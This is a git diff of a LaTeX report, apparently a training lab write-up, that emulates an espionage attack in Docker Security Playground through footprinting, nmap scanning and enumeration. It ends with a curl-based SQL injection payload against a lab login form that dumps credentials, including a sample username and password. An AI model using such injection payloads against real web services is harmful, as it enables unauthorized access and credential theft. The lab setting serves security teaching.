@@ -3,6 +3,7 @@
 \usepackage[utf8]{inputenc}
 \usepackage{geometry}
 \usepackage{courier}
+\usepackage{xcolor}
 \usepackage{listings}
 \lstset{language=bash}
 
@@ -13,6 +14,8 @@ bottom= 1.5 in,
 right=  1 in,
 top=    1 in
 }
+
+
 
 \usepackage{fancyhdr}
 
@@ -55,7 +58,42 @@ top=    1 in
 \tableofcontents
 }
 
+% stile per comandi bash
+\lstdefinestyle{DOS}
+{ 
+    backgroundcolor=\color{black},
+    basicstyle=\color{white}\fontfamily{ttfamily}
+}
+
+
 \mainmatter
+
+
+
+
+\chapter{Introduction}
+In this paper an example of espionage attack will be emulated. 
+The attacker Bob is infiltrated in a company's local network and exploits vulnerabilities to gain privileged access to the entire system.
+The vulnerabilities concern: a web server local to the company that makes insecure requests to the database; a vulnerable computer of employee Tom.
+The entire example is compatible with Docker Security Playground (DSP), through which it can be emulated.
+\section{Network Configuration}
+\begin{center}
+\includegraphics[scale=1]{../Image/network.PNG}
+\end{center}
+Sql Network: 
+\begin{itemize}
+  \item Web Server: it hosts a simple NodeJS website.
+  \item MySQL Server: it stores sensitive information of the company
+\end{itemize} 
+Employee Network: 
+\begin{itemize}
+  \item BobPC: it represents the attacker host.
+  \item TomPC: it represents the target host.
+\end{itemize} 
+Company Network: it connects all the employees to the company web service.
+
+
+
 \chapter{Footprinting}
 The footprinting phase involves gathering information in the network regarding the target, in our case the organization and its members.
 \newline In this scenario, the attacker already knows information regarding the company and has managed to connect to the target local network.
@@ -65,27 +103,26 @@ The footprinting phase involves gathering information in the network regarding t
 \begin{center}
 \includegraphics[scale=1]{../Image/footprinting_company_network.png}
 \end{center}
-\begin{lstlisting}
-  nmap -sn -PE --send-ip 193.20.3.0/24
-\end{lstlisting}
 \begin{center}
 \includegraphics[scale=0.76]{../Image/footprinting_employee_network.png}
 \end{center}
 From the top scan of the IP range 193.20.3.0/24, Bob found out one host up at 193.20.3.1 and its MAC Address. On the other subnet 193.20.1.0/24, there is another host up with the address 193.20.1.2.
 
-\newpage
 \chapter{Scanning}
-In this phase, the attacker explore the entire network perimeter by sending probe packets to endpoints with the goal of identify potential access points in the company systems.   
-Nmap (Network Mapper) is a versatile and powerful tool with a range of options and features. Here are some of the main options:
+In this phase, the attacker explores the entire network perimeter to gather information about 
+the target network in order to identify potential vulnerabilities and weak points that can be exploited.  
+\newline The scanning phase typically involves a combination of active and passive scanning methods. Active scanning involves 
+sending probe packets or requests to target systems to elicit a response, while passive scanning involves observing and analyzing network traffic without actually engaging with the target systems. 
+This is typically done using various scanning tools and techniques, including \textbf{\textit{Nmap}}: Network Mapper, a versatile and powerful tool with a range of options and features. 
+Here are some of the main options:
 \begin{itemize}
   \item Host Discovery: This option is used to discover hosts on a network. Nmap can identify active hosts, as well as those that are currently offline.
   \item Port Scanning: Port scanning is one of the most popular features of Nmap. It can be used to identify open ports on a target system, and even detect hidden ports and services.
   \item Service and Version Detection: This option is used to identify the services and versions of software running on the target system. This information can be useful in identifying vulnerabilities and weaknesses.
   \item Operating System Detection: Nmap can also be used to identify the operating system running on the target system. This information can be helpful in identifying potential attack vectors.
   \item Scripting Engine: Nmap has a powerful scripting engine that allows users to write and execute custom scripts. This feature can be used to automate tasks, customize scans, and extend the functionality of Nmap.
-  \item Output Formats: Nmap can generate output in various formats, including XML, HTML, and plain text. This feature can be helpful in generating reports, analyzing results, and sharing information with others.
 \end{itemize} 
-These are just a few of the main options available in Nmap. Other features include traceroute, firewall detection, and performance tuning options. Nmap is a highly flexible tool that can be customized to suit the needs of the user.
+These are just a few of the main options available in Nmap. Other features include traceroute, firewall detection, and performance tuning options.
 It has a number of flags or options that can be used to customize and fine-tune its scanning behavior.
 \newline Here are some commonly used flag options:
 \begin{itemize}
@@ -94,9 +131,6 @@ It has a number of flags or options that can be used to customize and fine-tune 
   \item \textbf{-sU}: This flag specifies a UDP scan, where Nmap sends UDP packets to the target ports and listens for responses.
   \item \textbf{-sC}: This flag specifies a scan usiong the default set of scripts. Some of the scripts in this category are considered intrusive.
   \item \textbf{-O}: This flag enables operating system detection, allowing Nmap to identify the operating system running on the target system.
-  \item \textbf{-p}: This flag specifies the ports to be scanned, and can take a range of values or a comma-separated list of individual port numbers.
-  \item \textbf{-oN}: This flag specifies the output format for Nmap results, in this case, plain text format.
-  \item \textbf{-oN}: This option is used to specify the output format of the scan results. For example, the command "nmap -oN output.txt" will save the scan results to a file called "output.txt".
 \end{itemize}
 The attacker Bob exploits the following nmap command to discover open services on the target host 193.20.3.1:
 \begin{center}
@@ -110,6 +144,7 @@ From the scan report, there are multiple open ports: \textit{http} on 8080, \tex
 From the scan report, there is only an open SSH 22/Tcp port.
 
 \chapter{Enumeration}
+The primary goal of the enumeration phase is to identify potential targets for further exploitation and gain a deeper understanding of the target network's structure and architecture.
 After discovering the potential access points on the hosts, it is necessary to reveal other information regarding the active services on the detected ports. In the enumeration phase,
 active connections are created towards the target services by using the nmap tool with appropriate flags. This phase is more dangerous and traceable than the previous techniques because it requires an higher level of intrusiveness.
 \newline The objective of this phase is the service fingerprinting, i.e. the detection of the specific version and implementation of the service through an analysis of the service behaviour. 
@@ -122,20 +157,58 @@ The attacker grabs information about the Web Server: it is implemented with Node
 \includegraphics[scale=0.76]{../Image/enumeration_tom_sv.PNG}
 \end{center}
 On the other host, nmap determines that: the ssh service is implemented with a specific version of OpenSSH and the OS family is Ubuntu Linux. 
+\newline With the tool \textit{curl} or \textit{wget}, the attacker can get information about the website pages. In a real case scenario, it is better to map the entire site with \textit{Dirbuster} or an analogous tool.
+\begin{center}
+  \includegraphics[scale=0.66]{../Image/webserver_curl.PNG}
+\end{center}
+From the last command, the attacker Bob discovers a login page that may be exploited.
+Once vulnerabilities are identified, the attacker can move on to the next phase of the attack, the exploitation phase.
 
 \chapter{Exploitation}
-After discovering the potential access points on the hosts, it is necessary to reveal other information regarding the active services on the detected ports. In the enumeration phase,
-active connections are created towards the target services by using the nmap tool with appropriate flags. This phase is more dangerous and traceable than the previous techniques because it requires an higher level of intrusiveness.
-\newline The objective of this phase is the service fingerprinting, i.e. the detection of the specific version and implementation of the service through an analysis of the service behaviour. 
-\newline The attacker uses the nmap flag -sV, which compares answers obtained with a service fingerprint database, to determine services version on the Web Server:
+The exploitation phase has the objective of gaining access to the target system and obtaining privileged information, such as usernames, passwords, and other sensitive data. 
+Attackers may use various methods to exploit vulnerabilities in the target system, including:
+\begin{enumerate}
+  \item Social engineering: Attackers may use social tactics to trick users into revealing sensitive information or clicking on malicious links that can install malware or grant unauthorized access to the target system.
+  \item Malware: Attackers may use malware, such as viruses, Trojans, or worms, to exploit vulnerabilities in the target system and gain unauthorized access.
+  \item Remote exploits: Attackers may use remote exploits to take advantage of vulnerabilities in network protocols or services, such as TCP/IP or HTTP, to gain unauthorized access to the target system.
+  \item Exploit kits: Attackers may use exploit kits, which are pre-packaged sets of tools and exploits, to automate the process of finding and exploiting vulnerabilities in the target system.
+\end{enumerate}
+
+In this case, the attacker Bob uses a mix of remote exploits to gain root access on the Employee PC.
+
+\section{Sql Injection}
+The attacker starts from the company web service by filling the login form with different combinations:
+
+\begin{lstlisting}[style=DOS]
+curl -X POST -d 'username=a&password=b' 193.20.3.1:8080
+\end{lstlisting}
+In this case, the website uses an url-encoded form, so the attacker can send the data as an url-encoded string. This one returns "Error value(s) missing".
+\newline The attacker tries to tamper the form with another combination:
+\begin{lstlisting}[style=DOS]
+  curl -X POST -d 'username=&password=b' 193.20.3.1:8080
+\end{lstlisting}
+which returns:
+\begin{lstlisting}[style=DOS]
+  {"success":false,"response":"No user found","result":[]}
+\end{lstlisting}
+Lastly, the attacker can try to insert a payload with a MySQL Injection, that uses OR and the commenting syntax:
+\begin{lstlisting}[style=DOS]
+  curl -X POST -d 'username=" OR 1<2; -- &password=b' \
+  193.20.3.1:8080
+\end{lstlisting}
+which returns a list of credentials:
 \begin{center}
-\includegraphics[scale=0.76]{../Image/enumeration_company_sv.PNG}
+  \includegraphics[scale=0.5]{../Image/webserver_sql.PNG}
 \end{center}
-The attacker grabs information about the Web Server: it is implemented with NodeJS and has a connection with a mySQL Database. Then, he does the same for the Employee computer:
-\begin{center}
-\includegraphics[scale=0.76]{../Image/enumeration_tom_sv.PNG}
-\end{center}
-On the other host, nmap determines that: the ssh service is implemented with a specific version of OpenSSH and the OS family is Ubuntu Linux. 
+including an entry related to the user Tom:
+\begin{lstlisting}[style=DOS]
+  username = tcasaccio1
+  password = YLN1NrMdGN
+\end{lstlisting}
+
+\section{SSH Access}
+
+\section{Privilege escalation}
 
 
 \end{document}
